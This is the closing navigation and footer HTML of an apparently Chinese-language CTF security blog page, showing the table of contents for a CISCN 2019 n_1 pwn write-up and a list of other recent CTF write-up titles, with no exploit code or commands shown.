href="#IEEE-754-%E5%8D%95%E7%B2%BE%E5%BA%A6"><span class="toc-text">IEEE 754 单精度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-struct-pack-%E6%89%93%E5%8C%85"><span class="toc-text">用 struct.pack 打包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF"><span class="toc-text">为什么是 &lt;f，不是 &lt;d</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99-exp"><span class="toc-text">写 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%80%8E%E4%B9%88%E7%9F%A5%E9%81%93-payload-%E7%9C%9F%E7%9A%84%E6%8C%89%E6%83%B3%E6%B3%95%E8%B5%B0%E4%BA%86"><span class="toc-text">你怎么知道 payload 真的按想法走了</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E9%85%8D%E7%BB%88%E7%AB%AF"><span class="toc-text">先配终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-debug"><span class="toc-text">gdb.debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%AD%A5%E5%88%B0-gets-%E4%B9%8B%E5%90%8E"><span class="toc-text">单步到 gets 之后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B-xmm0"><span class="toc-text">看 xmm0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E6%A0%88"><span class="toc-text">看栈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E8%BF%9C%E7%A8%8B%EF%BC%8C%E6%8B%BF-flag"><span class="toc-text">打远程，拿 flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%89%93%E6%B3%95%EF%BC%9A%E7%9B%B4%E6%8E%A5%E8%B7%B3%E8%BF%87%E5%88%A4%E6%96%AD"><span class="toc-text">另一种打法：直接跳过判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-text">新手常见问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5"><span class="toc-text">完整流程速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/06/pwn-ctf-ciscn-2019-n-1/" title="Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证">Pwn 入门：CISCN 2019 n_1——溢出 44 字节把 v2 改成 11.28125，并用 gdb 亲眼验证</a><time datetime="2026-11-06T02:00:00.000Z" title="发表于 2026-11-06 10:00:00">2026-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/05/pwn-ctf-warmup-csaw-2016/" title="Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐">Pwn 热身：CSAW 2016 warmup——没有符号表也能定位 main，两种方法绕过栈对齐</a><time datetime="2026-11-05T02:00:00.000Z" title="发表于 2026-11-05 10:00:00">2026-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/03/web-ctf-piapiapia/" title="[0CTF 2016] piapiapia：PHP 反序列化长度逃逸与数组绕过">[0CTF 2016] piapiapia：PHP 反序列化长度逃逸与数组绕过</a><time datetime="2026-11-03T11:30:00.000Z" title="发表于 2026-11-03 19:30:00">2026-11-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/02/pwn-ctf-rip/" title="Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell">Pwn 工具的基本使用：从搭环境到 BUUCTF rip 拿 shell</a><time datetime="2026-11-02T02:00:00.000Z" title="发表于 2026-11-02 10:00:00">2026-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/01/misc-wireshark-password/" title="[JBCTF] wireshark：从 HTTP 登录表单里找出 password">[JBCTF] wireshark：从 HTTP 登录表单里找出 password</a><time datetime="2026-11-01T02:20:00.000Z" title="发表于 2026-11-01 10:20:00">2026-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Quellisya</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div><div class="footer_custom_text">以墨为舟，以码为桨 · CTF & Web Security Notes</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script defer src="/js/butterfly-custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索笔记、题目或 payload…" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.0"></script></div></div></body></html>
